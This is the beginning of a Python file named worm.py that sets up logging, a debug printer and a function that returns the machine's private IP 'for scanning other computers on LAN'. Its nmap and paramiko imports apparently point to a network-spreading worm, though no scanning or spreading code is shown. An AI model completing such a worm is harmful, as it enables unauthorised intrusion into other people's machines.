####################################
# File name: worm.py               #
# Author: Filip Komárek            #
# Status: Development              #
# Date created: 7/6/2018           #
####################################
import nmap
import paramiko
import os
import logging

logger = logging.getLogger(__name__)
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    level=logging.INFO)
debug = True # Set this to True to see debug messages


def debug_print(text):
    """
    Prints debug messages only when debug mode is activated.

    Args:
        text: string
    """
    if debug:
        print("[?] " + text)


def get_ip():
    """
    Gets private IP address of this machine.
    This will be used for scanning other computers on LAN.

    Returns:
        private IP address
    """
    import socket
    return socket.gethostbyname(socket.gethostname())

